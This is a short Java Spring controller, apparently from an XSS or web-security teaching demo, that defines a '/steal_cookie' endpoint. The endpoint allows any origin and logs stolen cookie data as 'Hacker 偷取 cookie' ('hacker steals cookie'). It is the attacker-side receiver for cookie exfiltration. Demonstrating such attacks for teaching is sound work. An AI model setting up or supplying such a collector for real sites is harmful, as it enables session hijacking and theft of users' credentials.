package com.example.demo.controller;

import java.io.IOException;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HackerController {
	
	@RequestMapping("/steal_cookie")
	public String stealCookie(HttpServletRequest request, HttpServletResponse response) {
		response.addHeader("Access-Control-Allow-Origin", "*"); 
		System.out.println("Hacker 偷取 cookie: " + request.getParameter("data"));
		return "";
	}
	
	
}
